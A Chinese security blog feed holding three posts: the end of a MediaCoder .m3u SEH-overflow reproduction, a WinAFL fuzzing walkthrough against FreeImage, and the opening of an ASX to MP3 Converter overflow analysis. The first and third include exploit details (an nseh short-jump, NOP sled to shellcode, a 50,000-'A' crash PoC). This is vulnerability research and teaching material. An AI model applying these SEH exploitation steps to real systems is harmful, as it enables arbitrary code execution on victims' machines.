src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebyru0la5j30n108lgm2.jpg" alt="截屏2020-04-30 下午5.11.01"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebyrz2nj3j30nl0hwq49.jpg" alt="截屏2020-04-30 下午5.45.34"></p><p>总结来说就是由于对于文件的长度没有进行有效控制，从而导致后续函数处理调用畸形字符串时导致程序指针引用异常访问到了不可访问的位置，进入SEH处理，从而引发任意代码执行。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>原博中的exp没能成功利用而是直接崩溃，应该是位置没算好导致的，利用OD查看该程序SEH分布，离最近的应该是12f688，但是看原来生成的文件在堆栈里的分布正好错了一行，这是导致没有利用成功的主要原因</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebz33ujcsj30w40mpdk1.jpg" alt="截屏2020-04-30 下午4.34.19"></p><p>首尾减一下应该是768个A，再生成一边看看堆栈的分布，就正好对上了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebz521tbrj30e707qt91.jpg" alt="截屏2020-04-30 下午5.05.21"></p><p>再看SEH的跳转地址也变对了，指向下一个SEH记录的指针（简称nseh），指示下一个seh结构的位置，此处使用“ \ xeb \ x06 \ x90 \ x90”填充，这四字节反汇编的结果是jmp 6，nop，nop三条指令，jmp 6表示跳过6个字节，刚好跳过两个nop指令和一个4字节的seh处理程序地址，然后落入nop指令区，滑行进入shellcode。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebz6ewn40j308906kq30.jpg" alt="截屏2020-04-30 下午5.05.29"></p><p>整个利用过程就如下图所示</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebzqguv6cj30g807jgmb.jpg" alt="image-20200430185453204"></p><p>此时把文件拖入程序尝试一下，发现成功蹦出了计算器</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebzscfjhgj311w0kd1aw.jpg" alt="image-20200430185641358"></p><h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><p>漏洞分析——MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞 <a href="https://ayesawyer.github.io/2019/07/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94MEDIACODER-0-8-43-5852-M3U%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">https://ayesawyer.github.io/2019/07/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94MEDIACODER-0-8-43-5852-M3U%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</a></p><p>MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞</p><p><a href="https://whereisk0shl.top/post/2018-06-23">https://whereisk0shl.top/post/2018-06-23</a></p><p>Mediacoder 0.8.43.5852-‘.m3u’（SEH）</p><p> <a href="https://www.exploit-db.com/exploits/40148">https://www.exploit-db.com/exploits/40148</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinAFL小白踩坑指南</title>
      <link href="2020/04/20/winafl%E5%B0%9D%E8%AF%95/"/>
      <url>2020/04/20/winafl%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容包括：WinAFL介绍与安装、以ABC看图程序为例构建Fuzz最小案例库、执行Fuzz跑出Crash，以及最终利用Bugid对Crash分类</p><a id="more"></a><h3 id="WinAFL介绍与安装"><a href="#WinAFL介绍与安装" class="headerlink" title="WinAFL介绍与安装"></a>WinAFL介绍与安装</h3><p>WinAFL，是<a href="https://twitter.com/ifsecure">Ivan Fratric</a>基于<a href="http://lcamtuf.coredump.cx/afl/">lcumtuf的AFL</a>创建的大型Fuzzing程序，由于<a href="http://lcamtuf.coredump.cx/afl/">AFL</a> 无法在windows下直接使用，Winafl弥补了这一空白，使用DynamoRIO来插桩&amp;测量代码覆盖率，并使用Windows API进行内存和进程创建。</p><p>WinAFL 项目地址：<a href="https://github.com/ivanfratric/winafl">https://github.com/ivanfratric/winafl</a></p><p>请注意：Windows 10 1809及更高版本的最新Windows版本要使用DynamoRIO 8.0.0以上版本</p><p>此时如果直接进行操作可能会出现以下报错</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6v611hwzj30pp03btbq.jpg" alt="截屏2020-04-23 上午9.52.25"></p><p>需要re-compiled ,这个过程为：</p><p>(1) 下载安装DynamoRio源码，或者直接下载DynamoRio Windows版的二进制包(<a href="https://joyceqiqi.wordpress.com/2017/06/02/winafl%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/#">https://github.com/DynamoRIO/dynamorio/wiki/Downloads</a>)</p><p>(2) 打开Visual Studio命令提示工具，如果要安装成64位版本的则打开Visual Studio x64命令提示工具（一般在【开始—所有程序—Visual Stdio—Visual Studio Tools】中可找到）。因为在对64位程序进行fuzz时，需要有64-bit的winafl.dll，所以安装时要选择好版本</p><p>(3)在命令提示工具中进入WinAFL的目录下</p><p>(4) 在Visual Studio命令提示工具中输入如下命令进行WinAFL编译安装（需将-DDynamoRIO_DIR参数设置为你的DynamoRIO cmake文件所在位置）</p><p>32-bit build:</p><pre><code class="shell">mkdir build32cd build32cmake -G&quot;Visual Studio 16 2019&quot; -A Win32 .. -DDynamoRIO_DIR=..\path\to\DynamoRIO\cmake cmake --build . --config Release</code></pre><p>64-bit build:</p><pre><code class="shell">mkdir build64cd build64cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=..\path\to\DynamoRIO\cmakecmake --build . --config Release</code></pre><p>这里需要注意一下-G选择平台时VS16与之前版本默认目标平台架构是有些区别的：</p><pre><code class="shell">cmake -G &quot;Visual Studio 16 2019&quot; -A Win32   ;x32cmake -G &quot;Visual Studio 16 2019&quot; -A x64     ;x64  默认目标平台名称（架构）为Win64cmake -G &quot;Visual Studio 15 2017&quot;            ;x32  默认目标平台名称（架构）为Win32cmake -G &quot;Visual Studio 15 2017 Win64&quot;      ;x64</code></pre><p>winafl 命令行参数，主要分为三段,(afl执行参数–dynamoRIO执行参数–程序执行参数)</p><ul><li>afl执行参数主要包括<ul><li><strong>-i -o</strong> 指定输入和输出文件夹</li><li><strong>-D</strong> 指定DynamoRIO根目录</li><li><strong>-t</strong>  每一次样本执行的超时时限</li><li><strong>-f</strong> fuzz 程序读取的位置</li><li><strong>-M \ -S</strong> 分布式模式</li><li><strong>-x</strong> 可选的fuzz字典</li></ul></li><li>dynamRIO执行参数主要包括<ul><li><strong>-coverage_module</strong> 计算覆盖率的模块</li><li><strong>-fuzz_iterations</strong> 在重新启动目标进程之前，目标函数要运行的最大迭代次数。</li><li><strong>-target_module</strong> 包含目标函数的模块(一个可执行文件镜像)需要与该选项一起指定-target_method或-target_offset</li><li><strong>-target_method</strong> 目标函数，需要export或者带符号</li><li><strong>-target_offset</strong> 目标偏移，相对于target_module的偏移，在method无法导出的时候使用</li><li><strong>-nargs</strong> 程序执行所需要的参数个数</li><li><strong>-debug</strong> 调试模式。不要尝试连接到服务器。输出包含已加载模块，打开的文件和覆盖率信息的日志文件</li><li><strong>-logdir</strong> 指定将日志文件写入哪个目录（仅与-debug一起使用）</li></ul></li><li>程序执行参数<br>就是要fuzz的程序的命令行</li></ul><h3 id="构建Fuzz最小案例库"><a href="#构建Fuzz最小案例库" class="headerlink" title="构建Fuzz最小案例库"></a>构建Fuzz最小案例库</h3><p>现在我们从网上搜集一堆ABC看图支持的格式，包括tif、jpg、png、ico等，github上有许多Fuzz的案例库，这样的案例库中包含大量的文件，运行起来效率会很差。根据学长博客，AFL是存在语料库蒸馏（Corpus Distillation）工具的，afl-cmin和afl-tmin。</p><ol><li>移除执行相同代码的输入文件——AFL-CMIN<br>afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。</li><li>减小单个输入文件的大小——AFL-TMIN<br>整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin尽量缩减文件体积。</li></ol><p>在winafl中，他们存在于 winafl-cmin.py，对输入的样本文件进行最小化处理，以用来提高 WinAFL 的执行效率。</p><p>筛选命令</p><pre><code class="python">python winafl-cmin.py --working-dir C:\Users\test\Desktop\winafl-master\build32\bin\Release -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 100000 -i C:\Users\test\Desktop\jpg -o C:\Users\test\Desktop\jpg\out -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -nargs 2 -- C:\Users\test\source\repos\Project1\Release\Project1.exe @@</code></pre><p>此时可能出现[!] Dry-run failed, 2 executions resulted differently:Tuples matching? False的报错</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6ywxmm5cj30p206iq5z.jpg" alt="截屏2020-04-24 下午6.00.34"></p><p>看来测试用例中存在一些坏的用例，导致不能正确精简，在语料库所在文件夹可以利用以下bash脚本简单判断一下</p><pre><code class="bash">λ for file in *; do printf &quot;==== FILE: $file =====\n&quot;;/c/Users/test/source/repos/Project1/Release/Project1.exe $file ;echo $?; done</code></pre><p>正常运行的文件返回值都是0，有问题的文件返回结果都不太正常</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70jesh5mj30h80at422.jpg" alt="image-20200426113452542"></p><p>把这些返回结果不太正常的删除之后，再运行一次语料库蒸馏，发现运行成功了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70lh6yrlj30z60ak0xi.jpg" alt="截屏2020-04-24 下午6.51.49的副本"></p><p>可以看到原本429张被精简到了148张，确实少了不少，根据参考教程中的提示，Winafl在处理大于4Kb的图片时，速度会变得很慢，因此再删除一波，最终语料库就剩下这么点了。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70r1i5iaj31cj0lwqrn.jpg" alt="image-20200426114211822"></p><h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>经过动态和静态的简单分析后，发现ABC看图主要调用Freeimage.dll进行图片解析的，决定对 FreeImage 库的载入函数进行模糊测试，针对 FreeImage_LoadU 函数编写测试程序</p><pre><code class="c++">#define _CRT_SECURE_NO_WARNINGS#include &lt;windows.h&gt; #include &lt;tchar.h&gt;#include &lt;iostream&gt;using namespace std;extern &quot;C&quot; __declspec(dllexport) int main(int argc, char** argv);void test(HINSTANCE hinstLib, wchar_t* PathName);wchar_t* charToWChar(const char* text);typedef DWORD(__stdcall* FreeImage_GetFileTypeU)(const wchar_t* lpszPathName, int flag);typedef DWORD(__stdcall* FreeImage_Initialise)(BOOL load_local_plugins_only);typedef DWORD(__stdcall* FreeImage_DeInitialise)();typedef DWORD(__stdcall* FreeImage_LoadU)(DWORD format, const wchar_t* lpszPathName, int flag);typedef DWORD(__stdcall* FreeImage_UnLoad)(DWORD dib);FreeImage_Initialise Initialise;FreeImage_GetFileTypeU LoadFileType;FreeImage_LoadU LoadU; DWORD load;FreeImage_UnLoad UnLoad;FreeImage_DeInitialise DeInitialise;int main(int argc, char** argv)&#123;    if (argc &lt; 2) &#123;        printf(&quot;Usage: %s &lt; file&gt;\n&quot;, argv[0]);        return 0;    &#125;    wchar_t* PathName = charToWChar(argv[1]);    HINSTANCE hinstLib; BOOL fFreeResult, fRunTimeLinkSuccess = FALSE; DWORD Error = NULL;    hinstLib = LoadLibrary(TEXT(&quot;C:\\FreeImage.dll&quot;));    if (hinstLib != NULL)    &#123;        fRunTimeLinkSuccess = TRUE;        Initialise = (FreeImage_Initialise)GetProcAddress(hinstLib, (LPCSTR)163); // 初始化 FreeImage 库        LoadFileType = (FreeImage_GetFileTypeU)GetProcAddress(hinstLib, (LPCSTR)126);// 获取位图文件类型        LoadU = (FreeImage_LoadU)GetProcAddress(hinstLib, (LPCSTR)181);    // 加载位图        UnLoad = (FreeImage_UnLoad)GetProcAddress(hinstLib, (LPCSTR)242);// 卸载位图        DeInitialise = (FreeImage_DeInitialise)GetProcAddress(hinstLib, (LPCSTR)83);//卸载 FreeImage 库        test(hinstLib, PathName);        fFreeResult = FreeLibrary(hinstLib);    &#125;    if (!fRunTimeLinkSuccess)        cout &lt;&lt; &quot;加载函数失败, Error: &quot; &lt;&lt; Error &lt;&lt; endl;    return 0;&#125;void test(HINSTANCE hinstLib, wchar_t* PathName)&#123;    DWORD FileType = (LoadFileType)(PathName, 0);    load = (LoadU)(FileType, PathName, 0);    return;&#125;wchar_t* charToWChar(const char* text)&#123;    size_t size = strlen(text) + 1;    wchar_t* wa = new wchar_t[size];    mbstowcs(wa, text, size);    return wa;&#125;</code></pre><p>在对该程序进行编译之后，可以先简单测试一下WinAFL 是否可以正常使用。-debug 表示设置为调试模式。</p><pre><code class="shell">\winafl\bin32&gt; C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32\drrun.exe -c winafl.dll -debug -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -fuzz_iterations 10 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe C:\Users\test\Desktop\jpg\1x1-low.jpg</code></pre><p>如下图所示，日志文件当中模块加载正常并没有错误显示</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71bk08znj30u80htk1b.jpg" alt="image-20200426120155981"></p><p>下面就要开始模糊测试了，按照教程进行的，但是它的目标函数是main，我们来看看结果如何。</p><pre><code class="shell">afl-fuzz.exe -i C:\Users\test\Desktop\jpg\out -o C:\Users\test\Desktop\jpg\re -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -fuzz_iterations 5000 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe @@</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71f0ipmzj30lq0kvn4l.jpg" alt="截屏2020-04-23 下午5.17.24"></p><p>如图所示，可以跑是可以跑，但是这个速度实在太慢了，执行main函数浪费了太多时间，实际上我们的load函数只测test函数就可以，我们将-target_method改为test尝试一下</p><pre><code class="shell">afl-fuzz.exe -i C:\Users\test\Desktop\jpg\out -o C:\Users\test\Desktop\jpg\re -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe @@</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71j4kjn3j30hd079jsl.jpg" alt="1587641858789_8DC06F32-53EE-4A64-8FD1-45907DC9CF93"></p><p>然后就蹦框了，看起来是没有找到我们写的test函数，忘了在vs里把test函数也导出</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71lacv24j30i90200tk.jpg" alt="image-20200426121116517"></p><p>这里导出后再编译一遍，再尝试一下，成功了，这速度明显提升了好几倍啊</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71q85ybaj30ko0bkn57.jpg" alt="image-20200426121601823"></p><p>为了让fuzz效率更高一点，充分利用cpu的多核，进行多核系统的并行测试</p><pre><code class="shell">afl-fuzz.exe -i C:\Users\test\Desktop\jpg\out -o C:\Users\test\Desktop\jpg\re -M master -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe @@afl-fuzz.exe -i C:\Users\test\Desktop\jpg\out -o C:\Users\test\Desktop\jpg\re -S slaver01 -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe @@afl-fuzz.exe -i C:\Users\test\Desktop\jpg\out -o C:\Users\test\Desktop\jpg\re -S slaver02 -D C:\Users\test\Desktop\DynamoRIO-Windows-8.0.0-1\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\Users\test\source\repos\Project1\Debug\Project1.exe @@</code></pre><p>因为我的配置比较垃圾只有四核，所以就开这么多了😂核多的朋友请自行往上添加，挂了一个晚上跑出来了不少的crash，我们先试一下</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71vxdm8lj30dx08pn0e.jpg" alt="image-20200426122130582"></p><p>扔到ABC看图里，发现真的崩溃了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71wm6ez1j30x80mfaec.jpg" alt="截屏2020-04-25 上午8.07.03"></p><h3 id="利用Bugid对Crash分类"><a href="#利用Bugid对Crash分类" class="headerlink" title="利用Bugid对Crash分类"></a>利用Bugid对Crash分类</h3><p>这样一堆crash，里面肯定有不少重复的，原因也有各不相同，如何对他们进行快速分类并找到问题点呢？</p><p>在这里我使用了BugID，它可以反馈崩溃和死机的可利用性的详细报告，BugID安装所需要的环境如下：</p><ul><li>最新的<a href="https://www.python.org/downloads/release/python-2715/">Python 2.7.14</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/">Windows的</a>最新<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/">调试工具</a></li><li>最新的<a href="https://github.com/SkyLined/BugId/releases">BugId版本</a></li></ul><p>如果使用默认设置安装Windows的Python和调试工具，则BugId应该能够运行而无需调整任何设置。您可以在本地文件系统上任意位置解压缩BugId</p><p>但是理论上BugID需要一个一个进行文件分析，而Crash这么多，只是就可以写一个Python脚本来帮助我们</p><pre><code class="python">import sysimport ossys.path.append(r&quot;C:\Users\test\Desktop\BugId-master&quot;)testcases = []for root, dirs, files in os.walk(r&quot;C:\Users\test\Desktop\jpg\re\slaver01\crashes&quot;, topdown=False):    for name in files:        testcase =  os.path.abspath(os.path.join(root, name))        testcases.append(testcase)for testcase in testcases:    print (&quot;[*] Gonna run: &quot;, testcase)    os.system(r&#39;PageHeap.cmd &quot;Project1.exe&quot; ON&#39;)    os.system(r&#39;python C:\Users\test\Desktop\BugId-master\BugId.py C:\Users\test\source\repos\Project1\Debug\Project1.exe --isa= x86 -- %s&#39; % testcase)</code></pre><p>请注意在最后的程序后面加上–isa= x86哦，不加默认作为64位调试会报错</p><p>运行脚本之后，我们就看到源源不断的bug信息出来了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge72be2rxoj31bn0jw4ok.jpg" alt="image-20200426123621956"></p><p>最后可以写到一个文档里保存下来，看起来字符好像有点问题，不过问题不大</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge72dqh0v9j30th0epgve.jpg" alt="image-20200426123837430"></p><p>这只是简要信息，BugID在运行时已经自动生成了较为详细的分析报告，打开BugID目录就可以看到</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge72fvy3s9j30gd05sn04.jpg" alt="image-20200426124040834"></p><p>随便打开一个看看，很详细</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge72gxjnipj30w00hkwow.jpg" alt="image-20200426124141616"></p><p>想看哪个选项点开就好了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge72hrzcvdj30xn0kqagv.jpg" alt="image-20200426124230545"></p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>winafl使用 <a href="http://www.simp1e.site/2020/04/18/winafl/">http://www.simp1e.site/2020/04/18/winafl/</a></p><p>模糊测试工具WinAFL使用指南 <a href="https://www.freebuf.com/articles/system/216437.html">https://www.freebuf.com/articles/system/216437.html</a></p><p>初识 Fuzzing 工具 WinAFL <a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p>Fuzz 工具 WinAFL 的使用感受 <a href="https://bbs.pediy.com/thread-255162.htm">https://bbs.pediy.com/thread-255162.htm</a></p><p>Fuzzing the MSXML6 library with WinAFL <a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Fuzzing </tag>
            
            <tag> BugID </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASX to MP3 Converter本地代码执行漏洞</title>
      <link href="2020/04/16/ASX%20to%20MP3%20Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/04/16/ASX%20to%20MP3%20Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>本文是针对ASX to MP3 Converter进行的漏洞分析</p><a id="more"></a><h3 id="背景概述"><a href="#背景概述" class="headerlink" title="背景概述"></a>背景概述</h3><p>本来是浏览学长博客<a href="https://whereisk0shl.top/post/2016-11-04">ASX TO MP3本地代码执行漏洞</a>感觉这个洞比较好入手，思路也比较清晰，就想着简单复现一下，但是在实际分析之中发现与博客原文写的有较大出入，于是自己一路分析上去，想搞清楚差异的地方探究真正的漏洞原因。</p><p>实验环境与原博中一样：</p><p>Asx to MP3 Converter 3.1.2（原博中写的是3.0.0，但提供的下载链接是3.1.2，是否是分析出现差异的原因？）</p><p>Windows xp sp3</p><p>Windbg</p><p>IDA pro</p><p>OD</p><p>软件下载地址：<a href="https://www.exploit-db.com/apps/b31a84e79d9941d89336b6708ef52a20-ASXtoMP3Converter_3121.exe">https://www.exploit-db.com/apps/b31a84e79d9941d89336b6708ef52a20-ASXtoMP3Converter_3121.exe</a></p><h4 id="SEH攻击原理简述（详情可参考0day2）"><a href="#SEH攻击原理简述（详情可参考0day2）" class="headerlink" title="SEH攻击原理简述（详情可参考0day2）"></a>SEH攻击原理简述（详情可参考0day2）</h4><p>为了保证系统在遇到错误时不至于崩溃，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制称为Windows异常处理机制。S.E.H即异常处理结构体(Structure Exception Handler)S.E.H链表指针和异常处理函数句柄，共计8个字节。</p><p>S.E.H结构体存放在系统栈中，线程初始化时，会自动向栈中安装S.E.H作为默认的异常处理。当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H中的异常处理函数进行处理。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx27wfgnrj30j00limzn.jpg" alt="image-20200417205721152"></p><p>利用思路基本是：</p><ol><li>通过溢出覆盖栈中SEH，将指向下一条记录的指针覆盖为shellcode地址；</li><li>触发一个SEH；</li><li>应用程序处理SEH时调用了指令，将指向下一条记录的指针作为EIP内容；</li><li>跳到shellcode地址，执行shellcode。</li></ol><h3 id="原博中的分析思路复现"><a href="#原博中的分析思路复现" class="headerlink" title="原博中的分析思路复现"></a>原博中的分析思路复现</h3><p>利用poc生成一个畸形m3u文件，播放器打开文件，程序崩溃</p><p>PoC:</p><pre><code class="python">poc = &quot;\x41&quot; * 50000rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)rst.write(poc)rst.close();</code></pre><p>原文理想中的情况应该是：</p><p>1.使用windbg到达漏洞现场，使用kb发现堆栈调用全是系统dll的调用，无法回溯漏洞发生前的关键函数，于是更改思路</p><p>2.想到该漏洞是一个文件格式的poc，那么在主程序中很有可能会通过fopen调用这个poc打开，以读取其中的文件从而触发文件格式的漏洞，于是想办法通过fopen函数来定位到漏洞发生前的函数</p><p>3.在IDA Pro中找到5个fopen的字符串函数，在这几个地址处用windbg打断点</p><p>4.发现在加载漏洞文件后windbg调用了fopen两次，第一次正常，在第二次时将畸形的文件格式读入到缓冲区中，而此时没有对文件的长度进行任何检查，而是直接读入缓冲区</p><p>5.继续运行再调用后续函数时，返回地址被覆盖，导致出现一个错误，调出SEH，而SEH已经被覆盖，最终程序结束</p><p>最终得出结论：<u>由于对于filename的长度检查不严格，导致直接作为参数回调到外层函数中，因此当外层函数结束时，程序返回到一个不可读的地址，从而触发了异常处理流程，因为文件畸形内容，导致了SEH指针被覆盖，程序可控。</u></p><p>我按照此思路复现实际遇到的情况：</p><p>1.使用windbg达到漏洞现场，发现可以回溯漏洞发生前的关键函数，断在了00430402的位置</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvq1jbwu6j313m0ldwqm.jpg" alt="image-20200416171026626"></p><p>2.在IDA中同样搜寻到5个fopen的调用并在windbg中对应打了断点，但是在实际调用中加载漏洞文件后windbg调用了fopen仅1次而不是2次，之后又会断在00430402</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx60i2881j31680n0gxo.jpg" alt="image-20200417230817139"></p><p>3.使用OllyDbg分析程序崩溃位置也与原博不同，原博程序是在执行到最后ret 4时，跳转地址被覆盖为414141不可读出现错误，实际调试过程中并未执行到该函数段最后，而是在过程中读写错误崩溃的，具体原因是：</p><p>0042BD1D  |mov ecx,dword ptr ss:[esp+0xAA48]  ；堆栈 ss:[000DBFB4]=41414141  </p><p>0042BD26  |push ecx ；堆栈000D1568   41414141  AAAA</p><p>004303E9  | mov ebx,dword ptr ss:[esp+0x10]  ；堆栈 ss:[000D1568]=41414141</p><p>004303FE  | mov esi,ebx ；ebx=41414141</p><p>00430402  |rep movs dword ptr es:[edi],dword ptr ds:[esi]  ；ds:[esi]=[41414141]=???</p><p>在执行rep movs操作中由于414141地址不可读导致出错，并且此时SEH已然被覆盖了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx74xnmd2j30pz0hejsy.jpg" alt="image-20200417234729856"></p><h4 id="此时的疑问"><a href="#此时的疑问" class="headerlink" title="此时的疑问"></a>此时的疑问</h4><p>1.既然没有第二次fopen依然崩溃，问题可能并不出在fopen操作，那么问题出在哪？</p><p>2.从图中可知SEH已经被覆盖，那么是在之前何处覆盖的？操作是什么？</p><p>此时我发现不止有我对此质疑，网上另一篇帖子也无法复现，和我的情况完全相同，为我提供了下一步的思路</p><p><a href="%5Bhttps://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%5D(https://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)">漏洞分析——ASX to MP3 Converter本地代码执行漏洞</a></p><h3 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h3><p>从崩溃地址00430402开始向上分析，追溯这一堆A的由来，首先断点依然在fopen处，虽然已经感觉问题不在这里，但还是看一下</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx7jyy5uij30x00huta4.jpg" alt="image-20200418000156687"></p><p>从地址428B46调用fopen，在428B72处调用freed读入文件的值，之后一直到fclose都没有任何异常数据，所以漏洞点并不在这部分代码中</p><p>继续向下调试，发现在42B62B位置调用MSA2Mfil.Playlist_FindNextItem后就开始有异常数据，可以判断问题出在该函数内部，且在模块列表中发现该函数是在程序自带的Dll库中，是MSA2Mfilter03.dll</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvrxtbi9zj311p0ln418.jpg" alt="image-20200416181606697"></p><p>同时使用IDA查看MSA2Mfilter03.dll中的代码，在Functions中确实有Playlist_FindNextItem函数</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvthnu1doj30ol0bcq3m.jpg" alt="image-20200416190947842"></p><p>在OD中也进入该dll逐步调试，在10008D55位置第一次出异常数据，在IDA中对应发现在函数sub_10008D20中无论条件如何，最终都会输出该异常数据</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8pij89nj30ud0alaal.jpg" alt="image-20200418004152406"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8kc3y6bj30fy0543yl.jpg" alt="image-20200418003654169"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8kw95vsj30kg0jewf8.jpg" alt="image-20200418003726435"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdxnpmnnogj30lu0h874t.jpg" alt="image-20200418092057997"></p><p>继续向下走，依旧是在该dll中，发现在地址1000D3C3处为溢出点，SEH就是在此处被覆盖掉的</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx95aznbxj319q0of0we.jpg" alt="image-20200418005703356"></p><p>ida中查看REP MOVS循环，其实是使用函数strcpy完成循环复制，问题就出现在strcpy函数。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvyzqnak9j30hg0b074p.jpg" alt="image-20200416222010065"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdxn6s8thoj31a70ozadj.jpg" 